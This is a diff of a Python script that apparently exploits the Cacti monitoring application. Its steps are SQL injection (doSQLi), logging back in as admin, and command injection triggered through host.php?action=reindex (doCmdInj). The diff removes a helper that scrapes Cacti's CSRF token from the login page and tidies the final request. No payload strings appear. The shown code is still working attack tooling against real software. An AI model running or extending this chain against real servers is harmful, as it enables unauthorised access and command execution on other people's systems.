@@ -200,39 +200,6 @@ def doSQLi():
     url2 = f"http://{cactihostname}:80/cacti/logout.php"
     session.get(url2, proxies=proxies, verify=False)
 
-def getCSRF2():
-    url = f"http://{cactihostname}:80/cacti/index.php"
-    # Fetch the page
-    response = session.get(url, proxies=proxies, verify=False)
-
-    # Check if the request was successful
-    if response.status_code != 200:
-        print(f"Failed to fetch the page. Status code: {response.status_code}")
-        exit()
-
-    # Parse the HTML content using BeautifulSoup
-    soup = BeautifulSoup(response.text, 'html.parser')
-
-    # Find all script tags
-    script_tags = soup.find_all('script')
-
-    # Search for csrfMagicToken in the script content
-    global csrf_token
-    print(colored("[+] Getting CSRF Token for re-use.", "green"))
-    for script in script_tags:
-        # Check if script.string is not None and contains csrfMagicToken
-        if script.string and 'csrfMagicToken' in script.string:
-            # Use regex to extract the csrfMagicToken value
-            csrf_token_match = re.search(r"csrfMagicToken\s*=\s*['\"]([^'\"]+)['\"]", script.string)
-            if csrf_token_match:
-                csrf_token = csrf_token_match.group(1)
-                break
-
-    if csrf_token:
-        print(f"CSRF Token:", colored(f"{csrf_token}", "blue"))
-    else:
-        print("CSRF token not found in the script content!")
-
 # Log back in as admin. 
 def doAdminLogin2():
     url = f"http://{cactihostname}:80/cacti/index.php"
@@ -254,9 +221,7 @@ def doAdminLogin2():
 def doCmdInj():  
     url = f"http://{cactihostname}:80/cacti/host.php?action=reindex"
     #headers2 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1"}
-    session.get(url, proxies=proxies)
-
-    
+    session.get(url, proxies=proxies) 
 
 # Order of functions
 if __name__ == "__main__":
